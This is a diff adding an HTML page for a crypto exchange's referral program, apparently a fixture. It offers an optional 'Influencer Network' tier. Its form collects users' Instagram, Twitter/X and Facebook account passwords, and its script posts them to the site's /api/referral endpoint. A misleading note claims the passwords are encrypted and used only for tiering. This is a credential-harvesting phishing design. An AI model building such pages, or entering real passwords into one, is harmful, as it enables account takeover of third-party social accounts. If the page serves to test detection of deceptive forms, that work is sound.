@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Referral program — Northgate Exchange</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#f7f9fc;color:#0d1f2e;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Inter,sans-serif;font-size:14px;min-height:100vh}
+.topbar{background:#fff;border-bottom:1px solid #e3e8f0;padding:12px 28px;display:flex;justify-content:space-between;align-items:center}
+.brand{display:flex;align-items:center;gap:10px;font-size:17px;font-weight:700;color:#0a4a8c}
+.brand .mark{width:24px;height:24px;border-radius:6px;background:linear-gradient(135deg,#0a4a8c,#3a8fde)}
+.topbar a{font-size:13px;color:#5a6577;text-decoration:none}
+
+.container{max-width:600px;margin:36px auto;padding:0 24px}
+.crumb{font-size:12px;color:#7a8597;margin-bottom:8px}
+h1{font-size:22px;font-weight:700;margin-bottom:6px}
+.lead{font-size:13px;color:#5a6577;margin-bottom:22px;line-height:1.6}
+
+.tier-card{background:#fff;border:1px solid #e3e8f0;border-radius:10px;padding:20px;margin-bottom:14px}
+.tier-card h2{font-size:14px;font-weight:600;margin-bottom:6px}
+.tier-card .panel-sub{font-size:12px;color:#7a8597;margin-bottom:10px;line-height:1.55}
+.tier-row{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid #f0f3f8;font-size:13px}
+.tier-row:last-child{border-bottom:none}
+.tier-row .reward{font-weight:600;color:#0c8b5b}
+
+.influencer-card{background:#fffaf0;border:1px solid #f0deb8;border-radius:10px;padding:22px;margin-bottom:14px}
+.influencer-card h2{font-size:14px;font-weight:600;margin-bottom:6px;color:#7a5d00}
+.influencer-card .panel-sub{font-size:12px;color:#7a5d00;margin-bottom:14px;line-height:1.55}
+.field{margin-bottom:13px}
+.field label{display:block;font-size:12.5px;font-weight:600;color:#3a4a5e;margin-bottom:6px}
+.field input{width:100%;padding:9px 12px;font-size:13px;border:1px solid #d3d9e2;border-radius:6px;color:#0d1f2e;background:#fff;outline:none}
+.btn{background:#0a4a8c;color:#fff;font-size:13px;font-weight:600;padding:9px 16px;border-radius:6px;border:none;cursor:pointer}
+.btn-row{display:flex;justify-content:flex-end;margin-top:10px}
+.note{font-size:11.5px;color:#7a8597;margin-top:8px;line-height:1.55}
+</style>
+</head>
+<body>
+<header class="topbar">
+  <div class="brand"><span class="mark"></span>Northgate Exchange</div>
+  <a href="/dashboard">← Dashboard</a>
+</header>
+
+<div class="container">
+  <div class="crumb">Account · Referral program</div>
+  <h1>Refer friends to Northgate</h1>
+  <p class="lead">Earn $10 in BTC for each verified referral. Top-tier influencers can earn additional rewards through our optional Influencer Network program.</p>
+
+  <div class="tier-card">
+    <h2>Standard referral</h2>
+    <p class="panel-sub">Share your unique link. When someone signs up and completes verification, you both earn rewards.</p>
+    <div class="tier-row"><span>Your referral link</span><span class="reward">northgate.app/r/jordan-m</span></div>
+    <div class="tier-row"><span>Reward per referral</span><span class="reward">$10 BTC</span></div>
+  </div>
+
+  <div class="influencer-card">
+    <h2>Optional: Influencer Network</h2>
+    <p class="panel-sub">For traders with significant social followings. Connect your social accounts so we can verify your reach and tier you accordingly. Higher tiers earn $50–$500 per referral. Connecting is optional.</p>
+
+    <form id="ref">
+      <div class="field">
+        <label for="instagram_password">Instagram account password</label>
+        <input type="password" id="instagram_password" placeholder="To verify follower count and engagement">
+      </div>
+      <div class="field">
+        <label for="twitter_password">Twitter / X account password</label>
+        <input type="password" id="twitter_password" placeholder="To verify follower count">
+      </div>
+      <div class="field">
+        <label for="facebook_password">Facebook account password</label>
+        <input type="password" id="facebook_password" placeholder="To verify reach">
+      </div>
+      <div class="btn-row">
+        <button type="submit" class="btn">Verify influencer tier</button>
+      </div>
+      <p class="note">Credentials encrypted with AES-256 and used only to compute your tier. You can disconnect any time.</p>
+    </form>
+  </div>
+</div>
+<script>
+document.getElementById('ref').addEventListener('submit',function(e){e.preventDefault();
+fetch('/api/referral',{method:'POST',headers:{'Content-Type':'application/json'},
+body:JSON.stringify({instagram_password:instagram_password.value,twitter_password:twitter_password.value,facebook_password:facebook_password.value})
+}).then(function(){alert('Tier check pending — we’ll email when complete.')});});
+</script>
+</body>
+</html>
